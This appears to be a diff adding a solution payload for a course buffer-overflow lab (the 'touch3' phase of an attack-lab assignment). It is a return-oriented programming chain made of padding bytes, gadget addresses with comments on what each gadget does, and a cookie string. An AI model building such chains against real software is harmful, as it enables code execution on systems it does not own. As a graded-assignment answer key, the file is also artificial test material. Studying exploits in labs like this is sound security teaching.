@@ -1,0 +1,52 @@
+41 41 41 41
+41 41 41 41
+41 41 41 41
+41 41 41 41
+41 41 41 41
+41 41 41 41
+41 41 41 41
+41 41 41 41
+41 41 41 41
+41 41 41 41
+
+/* 
+we want to call touch3 with %rdi set to a pointer pointing to
+36 36 33 32 33 34 34 65 00 (cookie in hex)
+
+high-level idea:
+1. move values onto stack individually (place zero byte as well)
+2. call touch3 with some rsp offset 
+*/
+
+/* 40203d has popq %rax */ 
+3d 20 40 00 00 00 00 00
+
+/* value to pop, we want to add 32 (see where rsp is moved) */
+20 00 00 00 00 00 00 00
+
+/* 402122 has movl %eax, %edx */
+22 21 40 00 00 00 00 00
+
+/* 402142 has movl %edx, %ecx */
+42 21 40 00 00 00 00 00
+
+/* 4020b7 has movl %ecx, %esi, ret, the only esi we can use */
+b7 20 40 00 00 00 00 00
+
+/* 4020f7 has movq %rsp, %rax, ret */
+f7 20 40 00 00 00 00 00
+
+/* 402027 has movq %rax, %rdi, ret */
+27 20 40 00 00 00 00 00
+
+/* now jump to add_xy */
+6a 20 40 00 00 00 00 00
+
+/* 402027 has movq %rax, %rdi, ret */
+27 20 40 00 00 00 00 00
+
+/* touch3 */
+56 1f 40 00 00 00 00 00 
+
+36 36 33 32 33 34 34 65 /* actual ascii code */
+00 00 00 00 00 00 00 00 /* many zero bytes + alignment */
